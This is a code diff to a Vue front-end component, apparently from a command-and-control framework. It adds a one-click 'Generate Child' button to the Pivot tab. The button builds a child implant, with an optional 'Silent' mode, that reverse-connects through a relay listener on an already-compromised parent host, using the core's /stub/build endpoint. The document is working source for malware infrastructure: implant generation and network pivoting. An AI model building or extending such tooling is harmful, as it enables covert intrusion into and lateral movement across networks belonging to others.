@@ -18,6 +18,12 @@
           <Plus :size="12" /> {{ starting ? 'Starting…' : 'Start Relay' }}
         </button>
       </div>
+      <div class="row child-row">
+        <label class="child-label"><Download :size="12" /> Child callback</label>
+        <input v-model="childHost" placeholder="parent reachable IP (e.g. 192.168.1.50)" class="inp host" />
+        <label class="check"><input v-model="childSilent" type="checkbox" /><span>Silent</span></label>
+        <span class="child-hint">Generate a child agent pointing at <code>{{ childConnect }}</code> — one click, no ListenerManager.</span>
+      </div>
       <p class="hint">
         The implant opens a TCP listener and splices each child connection onto a fresh link to the core.
         A child agent pointing its callback at <code>{{ connectHint }}</code> will appear online as a new implant.
@@ -31,7 +37,7 @@
             <th style="width: 120px">ID</th>
             <th>Listen</th>
             <th style="width: 110px">State</th>
-            <th style="width: 90px">Action</th>
+            <th style="width: 180px">Action</th>
           </tr>
         </thead>
         <tbody>
@@ -45,7 +51,15 @@
               <span v-if="r.error" class="err">— {{ r.error }}</span>
             </td>
             <td><span class="state" :class="stateClass(r.state)">{{ r.state }}</span></td>
-            <td>
+            <td class="action-cell">
+              <button
+                class="btn primary sm"
+                @click="generateChild(r)"
+                :disabled="r.state !== 'running' || !r.port || generating"
+                :title="r.state === 'running' && r.port ? `Generate child → ${childHost || parentHost}:${r.port}` : 'relay not running'"
+              >
+                <Download :size="11" /> {{ generating ? '…' : 'Generate Child' }}
+              </button>
               <button class="btn danger sm" @click="stopRelay(r)" :disabled="r.state === 'stopping' || r.state === 'stopped'">
                 <Square :size="11" /> Stop
               </button>
@@ -63,8 +77,8 @@
 </template>
 
 <script setup lang="ts">
-import { ref, computed, onMounted, onUnmounted } from 'vue'
-import { Network, RefreshCw, Plus, Square, Copy } from 'lucide-vue-next'
+import { ref, computed, watch, onMounted, onUnmounted } from 'vue'
+import { Network, RefreshCw, Plus, Square, Copy, Download } from 'lucide-vue-next'
 import api from '../services/api'
 import { useToastStore } from '../stores/toast'
 import { useAppStore } from '../stores/app'
@@ -77,6 +91,11 @@ const form = ref({ bind_ip: '0.0.0.0', port: 0 })
 const relays = ref<any[]>([])
 const loading = ref(false)
 const starting = ref(false)
+const generating = ref(false)
+// Child-agent callback config (one-click generate from the Pivot tab). Host
+// defaults to the parent's detected reachable IP; the operator can override.
+const childHost = ref('')
+const childSilent = ref(true)
 let pollTimer: ReturnType<typeof setInterval> | null = null
 
 // Suggested connect host: the parent's external IP if known, else its internal
@@ -86,6 +105,10 @@ const parentHost = computed(() => {
   return b?.external_ip || b?.internal_ip || form.value.bind_ip
 })
 const connectHint = computed(() => `${parentHost.value}:<port>`)
+// Pre-fill childHost once the parent's IP is known, but don't clobber a manual
+// edit afterwards.
+watch(parentHost, (h) => { if (!childHost.value) childHost.value = h }, { immediate: true })
+const childConnect = computed(() => `${childHost.value || parentHost.value}:<relay port>`)
 
 const stateClass = (s: string) => {
   if (s === 'running') return 'st-running'
@@ -145,6 +168,30 @@ const copyConnect = async (r: any) => {
   }
 }
 
+// One-click: generate a child agent that reverse-connects through this relay.
+// Reuses the core's /stub/build (which pops the OS Save As dialog via the Wails
+// bridge) — same path as GenerateAgentModal, just scoped to the relay port.
+const generateChild = async (r: any) => {
+  const host = (childHost.value || parentHost.value).trim()
+  if (!host) { toast.error('Enter the child callback host (parent reachable IP)'); return }
+  if (!r.port) { toast.error('Relay has no bound port yet'); return }
+  generating.value = true
+  try {
+    const name = `pivot_child_${host}_${r.port}`
+    const res = await api.post('/stub/build', { host, port: String(r.port), name, silent: childSilent.value })
+    const p = res.data?.data?.path
+    if (!p) {
+      toast.info('Save cancelled')
+      return
+    }
+    toast.success(`Child agent saved: ${p}`)
+  } catch (err: any) {
+    toast.error(err?.message || 'Failed to generate child agent')
+  } finally {
+    generating.value = false
+  }
+}
+
 const onSync = () => fetchRelays()
 
 onMounted(async () => {
@@ -167,11 +214,19 @@ onUnmounted(() => {
 .spacer { flex: 1; }
 
 .pivot-start { padding: 12px; border-bottom: 1px solid var(--bd); background: var(--bg-2); }
-.row { display: flex; align-items: center; gap: 8px; }
+.row { display: flex; align-items: center; gap: 8px; margin-top: 6px; }
+.row:first-child { margin-top: 0; }
 .row label { font-size: 10px; color: var(--tx-3); text-transform: uppercase; letter-spacing: 0.05em; }
 .inp { background: var(--bg-3); border: 1px solid var(--bd); color: var(--tx); padding: 5px 8px; border-radius: 3px; font-size: 11px; outline: none; width: 140px; }
 .inp.port { width: 90px; }
+.inp.host { width: 240px; }
 .inp:focus { border-color: var(--pri); }
+.child-row { align-items: center; }
+.child-label { display: inline-flex; align-items: center; gap: 4px; color: var(--pri) !important; }
+.check { display: inline-flex; align-items: center; gap: 5px; font-size: 11px; color: var(--tx-2); text-transform: none; letter-spacing: normal; cursor: pointer; }
+.check input { width: auto; margin: 0; }
+.child-hint { font-size: 10px; color: var(--tx-4); }
+.child-hint code { background: var(--bg-3); padding: 1px 5px; border-radius: 3px; color: var(--pri); font-family: var(--font-mono); }
 .hint { margin: 8px 0 0; font-size: 10px; color: var(--tx-4); line-height: 1.5; }
 .hint code { background: var(--bg-3); padding: 1px 5px; border-radius: 3px; color: var(--pri); font-family: var(--font-mono); }
 
@@ -187,6 +242,7 @@ onUnmounted(() => {
 .relay-table td { padding: 6px 12px; border-bottom: 1px solid var(--bd); border-right: 1px solid var(--bd); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 .relay-table tr:hover { background: var(--bg-4); }
 .mono-cell { color: var(--tx-2); }
+.action-cell { display: flex; align-items: center; gap: 6px; }
 .listen-addr { color: var(--pri); font-weight: 600; }
 .copy { background: transparent; border: none; color: var(--tx-4); cursor: pointer; padding: 0 4px; vertical-align: middle; }
 .copy:hover { color: var(--tx); }
